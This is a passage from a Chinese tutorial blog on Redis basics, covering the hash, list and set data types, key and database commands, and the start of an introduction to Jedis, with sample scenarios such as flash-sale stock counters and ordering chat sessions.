数据存储的困惑</h4><p>对象类数据的存储如果具有较频繁的更新需求操作会显得笨重！</p><p>在正式学习之前，我们先来看一个关于数据存储的困惑：</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Chash%E5%AD%98%E5%82%A8.png" alt></p><p>比如说前面我们用以上形式存了数据，如果我们用单条去存的话，它存的条数会很多。但如果我们用json格式，它存一条数据就够了。问题来了，假如说现在粉丝数量发生变化了，你要把整个值都改了。但是用单条存的话就不存在这个问题，你只需要改其中一个就行了。这个时候我们就想，有没有一种新的存储结构，能帮我们解决这个问题呢。</p><p>我们一块儿来分析一下：</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C%E6%95%B0%E6%8D%AE.png" alt></p><p>如上图所示：单条的话是对应的数据在后面放着。仔细观察：我们看左边是不是长得都一模一样啊，都是对应的表名、ID等的一系列的东西。我们可以将右边红框中的这个区域给他封起来。</p><p>那如果要是这样的形式的话，如下图，我们把它一合并，并把右边的东西给他变成这个格式，这不就行了吗？</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Chash%E6%95%B0%E6%8D%AE.png" alt></p><p>这个图其实大家并不陌生，第一，你前面学过一个东西叫hashmap不就这格式吗？第二，redis自身不也是这格式吗？那是什么意思呢？注意，这就是我们要讲的第二种格式，hash。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Chash%E7%BB%93%E6%9E%84.png" alt></p><p>在右边对应的值，我们就存具体的值，那左边儿这就是我们的key。问题来了，那中间的这一块叫什么呢？这个东西我们给他起个名儿，叫做field字段。那么右边儿整体这块儿空间我们就称为hash，也就是说hash是存了一个key value的存储空间。</p><h4 id="2-5-2-hash-类型">2.5.2  hash 类型</h4><p>新的存储需求：对一系列存储的数据进行编组，方便管理，典型应用存储对象信息</p><p>需要的存储结构：一个存储空间保存多个键值对数据</p><p>hash类型：底层使用哈希表结构实现数据存储</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Chash%E7%BB%93%E6%9E%84%E5%9B%BE.png" alt></p><p>如上图所示，这种结构叫做hash，左边一个key，对右边一个存储空间。这里要明确一点，右边这块儿存储空间叫hash，也就是说hash是指的一个数据类型，他指的不是一个数据，是这里边的一堆数据，那么它底层呢，是用hash表的结构来实现的。</p><p>值得注意的是：</p><p>如果field数量较少，存储结构优化为类数组结构</p><p>如果field数量较多，存储结构使用HashMap结构</p><h4 id="2-5-3-hash-类型数据的基本操作">2.5.3  hash 类型数据的基本操作</h4><p>添加/修改数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hset key field value<br></code></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hget key field<br>hgetall key<br></code></pre></td></tr></table></figure><p>删除数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hdel key field1 [field2]<br></code></pre></td></tr></table></figure><p>设置field的值，如果该field存在则不做任何操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hsetnx key field value<br></code></pre></td></tr></table></figure><p>添加/修改多个数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hmset key field1 value1 field2 value2 …<br></code></pre></td></tr></table></figure><p>获取多个数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hmget key field1 field2 …<br></code></pre></td></tr></table></figure><p>获取哈希表中字段的数量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hlen key<br></code></pre></td></tr></table></figure><p>获取哈希表中是否存在指定的字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexists key field<br></code></pre></td></tr></table></figure><h3 id="2-6-hash的拓展操作">2.6  hash的拓展操作</h3><p>在看完hash的基本操作后，我们再来看他的拓展操作，他的拓展操作相对比较简单：</p><h4 id="2-6-1-hash-类型数据扩展操作">2.6.1  hash 类型数据扩展操作</h4><p>获取哈希表中所有的字段名或字段值</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss">hkeys <span class="hljs-built_in">key</span><br>hvals <span class="hljs-built_in">key</span><br></code></pre></td></tr></table></figure><p>设置指定字段的数值数据增加指定范围的值</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">hincrby</span> key <span class="hljs-meta">field</span> increment<br><span class="hljs-symbol">hincrbyfloat</span> key <span class="hljs-meta">field</span> increment<br></code></pre></td></tr></table></figure><h4 id="2-6-2-hash类型数据操作的注意事项">2.6.2  hash类型数据操作的注意事项</h4><p>(1)hash类型中value只能存储字符串，不允许存储其他数据类型，不存在嵌套现象。如果数据未获取到，对应的值为（nil）。</p><p>(2）每个 hash 可以存储 232 - 1 个键值对<br>hash类型十分贴近对象的数据存储形式，并且可以灵活添加删除对象属性。但hash设计初衷不是为了存储大量对象而设计 的，切记不可滥用，更不可以将hash作为对象列表使用。</p><p>(3)hgetall 操作可以获取全部属性，如果内部field过多，遍历整体数据效率就很会低，有可能成为数据访问瓶颈。</p><h3 id="2-7-hash应用场景">2.7  hash应用场景</h3><h4 id="2-7-1-应用场景">2.7.1  应用场景</h4><p>双11活动日，销售手机充值卡的商家对移动、联通、电信的30元、50元、100元商品推出抢购活动，每种商品抢购上限1000  张。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Chash%E5%BA%94%E7%94%A8.png" alt></p><p>也就是商家有了，商品有了，数量有了。最终我们的用户买东西就是在改变这个数量。那你说这个结构应该怎么存呢？对应的商家的ID作为key，然后这些充值卡的ID作为field，最后这些数量作为value。而我们所谓的操作是其实就是increa这个操作，只不过你传负值就行了。看一看对应的解决方案：</p><h4 id="2-7-2-解决方案">2.7.2  解决方案</h4><p>以商家id作为key</p><p>将参与抢购的商品id作为field</p><p>将参与抢购的商品数量作为对应的value</p><p>抢购时使用降值的方式控制产品数量</p><p>注意：实际业务中还有超卖等实际问题，这里不做讨论</p><h3 id="2-8-list基本操作">2.8  list基本操作</h3><p>前面我们存数据的时候呢，单个数据也能存，多个数据也能存，但是这里面有一个问题，我们存多个数据用hash的时候它是没有顺序的。我们平时操作，实际上数据很多情况下都是有顺序的，那有没有一种能够用来存储带有顺序的这种数据模型呢，list就专门来干这事儿。</p><h4 id="2-8-1-list-类型">2.8.1  list 类型</h4><p>数据存储需求：存储多个数据，并对数据进入存储空间的顺序进行区分</p><p>需要的存储结构：一个存储空间保存多个数据，且通过数据可以体现进入顺序</p><p>list类型：保存多个数据，底层使用双向链表存储结构实现</p><p>先来通过一张图，回忆一下顺序表、链表、双向链表。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Clist1.png" alt></p><p>list对应的存储结构是什么呢？里边存的这个东西是个列表，他有一个对应的名称。就是key存一个list的这样结构。对应的基本操作，你其实是可以想到的。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Clist2.png" alt></p><p>来看一下，因为它是双向的，所以他左边右边都能操作，它对应的操作结构两边都能进数据。这就是链表的一个存储结构。往外拿数据的时候怎么拿呢？通常是从一端拿，当然另一端也能拿。如果两端都能拿的话，这就是个双端队列，两边儿都能操作。如果只能从一端进一端出，这个模型咱们前面了解过，叫做栈。</p><h4 id="2-8-2-list-类型数据基本操作">2.8.2 list 类型数据基本操作</h4><p>最后看一下他的基本操作</p><p>添加/修改数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lpush key value1 [value2] ……<br>rpush key value1 [value2] ……<br></code></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">lrange key start stop<br>lindex key index<br>llen key<br></code></pre></td></tr></table></figure><p>获取并移除数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lpop key<br>rpop key<br></code></pre></td></tr></table></figure><h3 id="2-9-list扩展操作">2.9  list扩展操作</h3><h4 id="2-9-1-list-类型数据扩展操作">2.9.1  list 类型数据扩展操作</h4><p>移除指定数据</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">lrem <span class="hljs-built_in">key</span> <span class="hljs-built_in">count</span> <span class="hljs-built_in">value</span><br></code></pre></td></tr></table></figure><p>规定时间内获取并移除数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">blpop key1 [key2] <span class="hljs-built_in">timeout</span><br>brpop key1 [key2] <span class="hljs-built_in">timeout</span><br>brpoplpush <span class="hljs-built_in">source</span> destination <span class="hljs-built_in">timeout</span><br></code></pre></td></tr></table></figure><h4 id="2-9-2-list-类型数据操作注意事项">2.9.2  list 类型数据操作注意事项</h4><p>（1）list中保存的数据都是string类型的，数据总容量是有限的，最多232 - 1 个元素(4294967295)。</p><p>（2）list具有索引的概念，但是操作数据时通常以队列的形式进行入队出队操作，或以栈的形式进行入栈出栈操作</p><p>（3）获取全部数据操作结束索引设置为-1</p><p>（4）list可以对数据进行分页操作，通常第一页的信息来自于list，第2页及更多的信息通过数据库的形式加载</p><h3 id="2-10-list-应用场景">2.10 list 应用场景</h3><h4 id="2-10-1-应用场景">2.10.1  应用场景</h4><p>企业运营过程中，系统将产生出大量的运营数据，如何保障多台服务器操作日志的统一顺序输出？</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Clist%E5%BA%94%E7%94%A8.png" alt></p><p>假如现在你有多台服务器，每一台服务器都会产生它的日志，假设你是一个运维人员，你想看它的操作日志，你怎么看呢？打开A机器的日志看一看，打开B机器的日志再看一看吗？这样的话你会可能会疯掉的！因为左边看的有可能它的时间是11:01，右边11:02，然后再看左边11:03，它们本身是连续的，但是你在看的时候就分成四个文件了，这个时候你看起来就会很麻烦。能不能把他们合并呢？答案是可以的！怎么做呢？建立起redis服务器。当他们需要记日志的时候，记在哪儿,全部发给redis。等到你想看的时候，通过服务器访问redis获取日志。然后得到以后，就会得到一个完整的日志信息。那么这里面就可以获取到完整的日志了，依靠什么来实现呢？就依靠我们的list的模型的顺序来实现。进来一组数据就往里加，谁先进来谁先加进去，它是有一定的顺序的。</p><h4 id="2-10-2-解决方案">2.10.2  解决方案</h4><p>依赖list的数据具有顺序的特征对信息进行管理</p><p>使用队列模型解决多路信息汇总合并的问题</p><p>使用栈模型解决最新消息的问题</p><h3 id="2-11-set-基本操作">2.11  set 基本操作</h3><h4 id="2-11-1-set类型">2.11.1 set类型</h4><p>新的存储需求：存储大量的数据，在查询方面提供更高的效率</p><p>需要的存储结构：能够保存大量的数据，高效的内部存储机制，便于查询</p><p>set类型：与hash存储结构完全相同，仅存储键，不存储值（nil），并且值是不允许重复的</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Cset%E6%A8%A1%E5%9E%8B.png" alt></p><p>通过这个名称，大家也基本上能够认识到和我们Java中的set完全一样。我们现在要存储大量的数据，并且要求提高它的查询效率。用list这种链表形式，它的查询效率是不高的，那怎么办呢？这时候我们就想，有没有高效的存储机制。其实前面咱讲Java的时候说过hash表的结构就非常的好，但是这里边我们已经有hash了，他做了这么一个设定，干嘛呢，他把hash的存储空间给改一下，右边你原来存数据改掉,全部存空，那你说数据放哪儿了？放到原来的filed的位置，也就在这里边存真正的值，那么这个模型就是我们的set 模型。</p><p>set类型：与hash存储结构完全相同，仅存储键，不存储值（nil），并且值是不允许重复的。</p><p>看一下它的整个结构：</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Cset4.png" alt></p><h4 id="2-11-2-set类型数据的基本操作">2.11.2 set类型数据的基本操作</h4><p>添加数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sadd key member1 [member2]<br></code></pre></td></tr></table></figure><p>获取全部数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smembers key<br></code></pre></td></tr></table></figure><p>删除数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">srem key member1 [member2]<br></code></pre></td></tr></table></figure><p>获取集合数据总量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scard key<br></code></pre></td></tr></table></figure><p>判断集合中是否包含指定数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sismember key member<br></code></pre></td></tr></table></figure><p>随机获取集合中指定数量的数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">srandmember key [count]<br></code></pre></td></tr></table></figure><p>随机获取集中的某个数据并将该数据移除集合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">spop key [count]<br></code></pre></td></tr></table></figure><h3 id="2-12-set-类型数据的扩展操作">2.12  set 类型数据的扩展操作</h3><h4 id="2-12-1-set-类型数据的扩展操作">2.12.1  set 类型数据的扩展操作</h4><p>求两个集合的交、并、差集</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">sinter key1 <span class="hljs-selector-attr">[key2 …]</span>  <br>sunion key1 <span class="hljs-selector-attr">[key2 …]</span>  <br>sdiff key1 <span class="hljs-selector-attr">[key2 …]</span><br></code></pre></td></tr></table></figure><p>求两个集合的交、并、差集并存储到指定集合中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">sinterstore destination key1 <span class="hljs-selector-attr">[key2 …]</span>  <br>sunionstore destination key1 <span class="hljs-selector-attr">[key2 …]</span>  <br>sdiffstore destination key1 <span class="hljs-selector-attr">[key2 …]</span><br></code></pre></td></tr></table></figure><p>将指定数据从原始集合中移动到目标集合中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smove <span class="hljs-built_in">source</span> destination member<br></code></pre></td></tr></table></figure><p>通过下面一张图回忆一下交、并、差</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C%E4%BA%A4%E5%B9%B6%E5%B7%AE.png" alt></p><h4 id="2-12-2-set-类型数据操作的注意事项">2.12.2  set 类型数据操作的注意事项</h4><p>set 类型不允许数据重复，如果添加的数据在 set 中已经存在，将只保留一份。</p><p>set 虽然与hash的存储结构相同，但是无法启用hash中存储值的空间。</p><h3 id="2-13-set应用场景">2.13  set应用场景</h3><h4 id="2-13-1-set应用场景">2.13.1  set应用场景</h4><p>（1）黑名单</p><p>资讯类信息类网站追求高访问量，但是由于其信息的价值，往往容易被不法分子利用，通过爬虫技术，  快速获取信息，个别特种行业网站信息通过爬虫获取分析后，可以转换成商业机密进行出售。例如第三方火 车票、机票、酒店刷票代购软件，电商刷评论、刷好评。</p><p>同时爬虫带来的伪流量也会给经营者带来错觉，产生错误的决策，有效避免网站被爬虫反复爬取成为每个网站都要考虑的基本问题。在基于技术层面区分出爬虫用户后，需要将此类用户进行有效的屏蔽，这就是黑名单的典型应用。</p><p>ps:不是说爬虫一定做摧毁性的工作，有些小型网站需要爬虫为其带来一些流量。</p><p>（2）白名单</p><p>对于安全性更高的应用访问，仅仅靠黑名单是不能解决安全问题的，此时需要设定可访问的用户群体， 依赖白名单做更为苛刻的访问验证。</p><h4 id="2-13-2-解决方案">2.13.2  解决方案</h4><p>基于经营战略设定问题用户发现、鉴别规则</p><p>周期性更新满足规则的用户黑名单，加入set集合</p><p>用户行为信息达到后与黑名单进行比对，确认行为去向</p><p>黑名单过滤IP地址：应用于开放游客访问权限的信息源</p><p>黑名单过滤设备信息：应用于限定访问设备的信息源</p><p>黑名单过滤用户：应用于基于访问权限的信息源</p><h3 id="2-14-实践案例">2.14  实践案例</h3><h4 id="2-14-1业务场景">2.14.1业务场景</h4><p>使用微信的过程中，当微信接收消息后，会默认将最近接收的消息置顶，当多个好友及关注的订阅号同时发 送消息时，该排序会不停的进行交替。同时还可以将重要的会话设置为置顶。一旦用户离线后，再次打开微信时，消息该按照什么样的顺序显示。</p><p>我们分析一下：</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Cset%E6%A1%88%E4%BE%8B.png" alt></p><p>100这台手机代表你。而200、300、400这三台代表你好友的手机。在这里有一些东西需要交代一下，因为我们每个人的都会对自己的微信中的一些比较重要的人设置会话置顶，将他的那条对话放在最上面。我们假定这个人有两个会话置顶的好友，分别是400和500，而这里边就包含400.</p><p>下面呢，我们就来发这个消息，第一个发消息的是300，他发了个消息给100。发完以后，这个东西应该怎么存储呢？在这里面一定要分开，记录置顶的这些人的会话，对应的会话显示顺序和非置顶的一定要分两。</p><p>这里面我们创建两个模型，一个是普通的，一个是置顶的，而上面的这个置顶的用户呢，我们用set来存储，因为不重复。而下面这些因为有顺序，很容易想到用list去存储,不然你怎么表达顺序呢？</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C300.png" alt></p><p>那当300发给消息给100以后，这个时候我们先判定你在置顶人群中吗？不在,那好，300的消息对应的顺序就应该放在普通的列表里边。而在这里边，我们把300加进去。第一个数据也就是现在300。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C400.png" alt></p><p>接下来400，发了个消息。判断一下，他是需要置顶的，所以400将进入list的置顶里边放着。当前还没有特殊的地方。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C200.png" alt></p><p>再来200发消息了，和刚才的判定方法一样，先看在不在置顶里，不在的话进普通，然后在普通里边把200加入就行了，OK，到这里目前还没有顺序变化。</p><p>接下来200又发消息过来，同一个人给你连发了两条，那这个时候200的消息到达以后，先判断是否在置顶范围，不在，接下来他要放在list普通中，这里你要注意一点，因为这里边已经有200，所以进来以后先干一件事儿，把200杀掉，没有200，然后再把200加进来，那你想一下，现在这个位置顺序是什么呢？就是新的都在右边，对不对？</p><p>还记得我们说list模型，如果是一个双端队列，它是可以两头进两头出。当然我们双端从一头进一头出，这就是栈模型，现在咱们运用的就是list模型中的栈模型。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C3002.png" alt></p><p>现在300发消息，先判定他在不在，不在，用普通的队列，接下来按照刚才的操作，不管你里边原来有没有300，我先把300杀掉，没了，200自然就填到300的位置了，他现在是list里面唯一一个，然后让300进来，注意是从右侧进来的，那么现在300就是最新的。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C%E5%88%86%E6%9E%90.png" alt></p><p>那么到这里呢，我们让100来读取消息。你觉得这个消息顺序应该是什么样的？首先置顶的400有一个，他跑在最上面，然后list普通如果出来的话，300是最新的消息，而200在他后面的。用这种形式，我们就可以做出来他的消息顺序来。</p><h4 id="2-14-2-解决方案">2.14.2  解决方案</h4><p>看一下最终的解决方案：</p><p>依赖list的数据具有顺序的特征对消息进行管理，将list结构作为栈使用</p><p>置顶与普通会话分别创建独立的list分别管理</p><p>当某个list中接收到用户消息后，将消息发送方的id从list的一侧加入list（此处设定左侧）</p><p>多个相同id发出的消息反复入栈会出现问题，在入栈之前无论是否具有当前id对应的消息，先删除对应id</p><p>推送消息时先推送置顶会话list，再推送普通会话list，推送完成的list清除所有数据消息的数量，也就是微信用户对话数量采用计数器的思想另行记录，伴随list操作同步更新</p><h4 id="2-14-3-数据类型总结">2.14.3  数据类型总结</h4><p>总结一下，在整个数据类型的部分，我们主要介绍了哪些内容：</p><p>首先我们了解了一下数据类型，接下来针对着我们要学习的数据类型，进行逐一讲解了string、hash、list、set等，最后通过一个案例总结了一下前面的数据类型的使用场景。</p><h2 id="3-常用指令">3. 常用指令</h2><p>在这部分中呢，我们家学习两个知识，第一个是key的常用指令，第二个是数据库的常用指令。和前面我们学数据类型做一下区分，前面你学的那些指令呢，都是针对某一个数据类型操作的，现在学的都是对所有的操作的，来看一下，我们在学习Key的操作的时候，我们先想一下的操作我们应该学哪些东西:</p><h3 id="3-1-key-操作分析">3.1  key 操作分析</h3><h4 id="3-1-1-key应该设计哪些操作？">3.1.1  key应该设计哪些操作？</h4><p>key是一个字符串，通过key获取redis中保存的数据</p><p>对于key自身状态的相关操作，例如：删除，判定存在，获取类型等</p><p>对于key有效性控制相关操作，例如：有效期设定，判定是否有效，有效状态的切换等</p><p>对于key快速查询操作，例如：按指定策略查询key</p><h4 id="3-1-2-key-基本操作">3.1.2  key 基本操作</h4><p>删除指定key</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">del key<br></code></pre></td></tr></table></figure><p>获取key是否存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exists key<br></code></pre></td></tr></table></figure><p>获取key的类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span> key<br></code></pre></td></tr></table></figure><p>3.1.3  拓展操作</p><p>排序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sort</span><br></code></pre></td></tr></table></figure><p>改名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rename key newkey<br>renamenx key newkey<br></code></pre></td></tr></table></figure><h4 id="3-1-3-key-扩展操作（时效性控制）">3.1.3  key 扩展操作（时效性控制）</h4><p>为指定key设置有效期</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">expire key seconds<br>pexpire key milliseconds<br>expireat key timestamp<br>pexpireat key milliseconds-timestamp<br></code></pre></td></tr></table></figure><p>获取key的有效时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ttl key<br>pttl key<br></code></pre></td></tr></table></figure><p>切换key从时效性转换为永久性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">persist key<br></code></pre></td></tr></table></figure><h4 id="3-1-4-key-扩展操作（查询模式）">3.1.4  key 扩展操作（查询模式）</h4><p>查询key</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">keys pattern<br></code></pre></td></tr></table></figure><p>查询模式规则</p><p>*匹配任意数量的任意符号      ?配合一个任意符号[]匹配一个指定符号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">keys *  keys    查询所有<br>it*  keys       查询所有以it开头<br>*heima          查询所有以heima结尾<br>keys ??heima    查询所有前面两个字符任意，后面以heima结尾 查询所有以<br>keys user:?     user:开头，最后一个字符任意<br>keys u[st]er:1  查询所有以u开头，以er:1结尾，中间包含一个字母，s或t<br></code></pre></td></tr></table></figure><h3 id="3-2-数据库指令">3.2  数据库指令</h3><h4 id="3-2-1-key-的重复问题">3.2.1  key 的重复问题</h4><p>在这个地方我们来讲一下数据库的常用指令，在讲这个东西之前，我们先思考一个问题：</p><p>假如说你们十个人同时操作redis，会不会出现key名字命名冲突的问题。</p><p>一定会，为什么?因为你的key是由程序而定义的。你想写什么写什么，那在使用的过程中大家都在不停的加，早晚有一天他会冲突的。</p><p>redis在使用过程中，伴随着操作数据量的增加，会出现大量的数据以及对应的key。</p><p>那这个问题我们要不要解决？要！怎么解决呢？我们最好把数据进行一个分类，除了命名规范我们做统一以外，如果还能把它分开，这样是不是冲突的机率就会小一些了，这就是咱们下面要说的解决方案！</p><h4 id="3-2-2-解决方案">3.2.2  解决方案</h4><p>redis为每个服务提供有16个数据库，编号从0到15</p><p>每个数据库之间的数据相互独立</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt></p><p>在对应的数据库中划出一块区域，说他就是几，你就用几那块，同时，其他的这些都可以进行定义，一共是16个，这里边需要注意一点，他们这16个共用redis的内存。没有说谁大谁小，也就是说数字只是代表了一块儿区域，区域具体多大未知。这是数据库的一个分区的一个策略！</p><h4 id="3-2-3-数据库的基本操作">3.2.3   数据库的基本操作</h4><p>切换数据库</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">index</span><br></code></pre></td></tr></table></figure><p>其他操作</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">ping</span><br></code></pre></td></tr></table></figure><h4 id="3-2-4-数据库扩展操作">3.2.4  数据库扩展操作</h4><p>数据移动</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">move</span> key <span class="hljs-keyword">db</span><br></code></pre></td></tr></table></figure><p>数据总量</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dbsize</span><br></code></pre></td></tr></table></figure><p>数据清除</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">flushdb  flushall</span><br></code></pre></td></tr></table></figure><h2 id="4-Jedis">4. Jedis</h2><p>在学习完redis后，我们现在就要用Java来连接redis了，也就是我们的这一章要学的Jedis了。在这个部分，我们主要讲解以下3个内容：</p><p>HelloWorld（Jedis版）</p><p>Jedis简易工具类开发</p><p>可视化客户端</p><h3 id="4-1-Jedis简介">4.1  Jedis简介</h3><h4 id="4-1-1-编程语言与redis">4.1.1  编程语言与redis</h4><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Cjedis1.png" alt></p><p>对于我们现在的数据来说，它是在我们的redis中，而最终我们是要做程序。那么程序就要和我们的redis进行连接。干什么事情呢？两件事：程序中有数据的时候，我们要把这些数据全部交给redis管理。同时，redis中的数据还能取出来，回到我们的应用程序中。那在这个过程中，在Java与redis之间打交道的这个东西就叫做Jedis.简单说，Jedis就是提供了Java与redis的连接服务的，里边有各种各样的API接口，你可以去调用它。</p><p>除了Jedis外，还有没有其他的这种连接服务呢？其实还有很多，了解一下：</p><p>Java语言连接redis服务 Jedis（SpringData、Redis 、 Lettuce）</p><p>其它语言：C 、C++ 、C# 、Erlang、Lua 、Objective-C 、Perl 、PHP 、Python 、Ruby 、Scala</p><h4 id="4-1-2-准备工作">4.1.2  准备工作</h4><p>(1)jar包导入</p><p>下载地址：<a href="https://mvnrepository.com/artifact/redis.clients/jedis">https://mvnrepository.com/artifact/redis.clients/jedis</a></p><p>基于maven</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>redis.clients<span class="hljs-tag">&lt;/<span 